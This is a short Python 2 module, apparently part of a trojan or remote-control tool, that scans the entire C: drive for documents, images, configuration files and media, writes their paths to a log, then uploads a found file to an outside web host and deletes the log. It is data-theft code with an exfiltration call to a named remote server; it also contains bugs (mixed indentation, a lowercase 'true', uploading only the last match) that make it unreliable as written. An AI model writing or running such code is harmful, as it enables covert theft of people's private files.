import os
import requests
import fnmatch
import threading


def run(**args):
    print "[*] In dirlister module."
    hit = ""
    f_des = open("dirmodule.lst" , "w")
    doc_types = [".doc",".xls",".config",".jpg",".png",".README",".pdf",".mp3",".ppt",".mp4",".txt",".wav",".html"] 
    for parent ,directories,filenames in os.walk("C:\\"):
        for doc_type in doc_types:
	      for filename in fnmatch.filter(filenames , "*%s" % doc_type):
                  document_path = os.path.join(parent,filename)    
	          hit = "\nFound: %s" % document_path
		  print hit
		  f_des.write(hit)

    f_des.close()
    print "\n Sending to remote server"
	#Send to remote server
    url = "http://psyberlupus.000webhostapp.com/site.php/post"
    files = {'document': open(document_path,"rb") }
    r = requests.post(url, files=files)	  
    os.remove("dirmodule.lst")
    print "dir module sent"
    return true    
#run()
